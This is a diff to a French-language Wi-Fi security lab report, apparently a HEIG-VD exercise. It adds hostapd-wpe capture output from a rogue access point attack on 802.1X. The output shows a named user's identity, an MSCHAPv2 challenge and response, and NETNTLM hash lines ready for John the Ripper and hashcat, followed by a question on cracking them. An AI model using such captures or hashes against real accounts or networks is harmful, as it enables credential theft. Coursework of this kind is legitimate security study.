@@ -282,6 +282,26 @@ voici à quoi le certificat ressemble sur le device se connectant :
 
 Vous trouverez tout les fichiers générés par l'outil [ici](./files/HEIG-VD/)
 
+Voici aussi l'output de la capture de hostapd-wpe :
+
+```bash
+
+wlan0: STA 2e:e2:97:8d:d6:4f IEEE 802.1X: Identity received from STA: 'einet/joachim.bailat'
+
+
+mschapv2: Wed May 24 08:02:14 2023
+         username:      einet/joachim.bailat
+         challenge:     00:8f:09:ce:08:f8:7f:c1
+         response:      c5:24:d3:41:51:cd:5c:05:b2:ad:e3:84:76:c3:e2:9a:79:ed:d5:c3:c5:ce:cf:26
+         jtr NETNTLM:           einet/joachim.bailat:$NETNTLM$008f09ce08f87fc1$c524d34151cd5c05b2ade38476c3e29a79edd5c3c5cecf26
+         hashcat NETNTLM:       einet/joachim.bailat::::c524d34151cd5c05b2ade38476c3e29a79edd5c3c5cecf26:008f09ce08f87fc1
+wlan0: STA 2e:e2:97:8d:d6:4f IEEE 802.1X: Identity received from STA: 'einet/joachim.bailat'
+wlan0: STA 2e:e2:97:8d:d6:4f IEEE 802.11: disassociated
+wlan0: STA 2e:e2:97:8d:d6:4f IEEE 802.11: deauthenticated due to inactivity (timer DEAUTH/REMOVE)
+
+```
+
+
 ---
 
 > **_Question:_** Quel type de hash doit-on indiquer à john ou l'outil que vous avez employé pour craquer le handshake ?
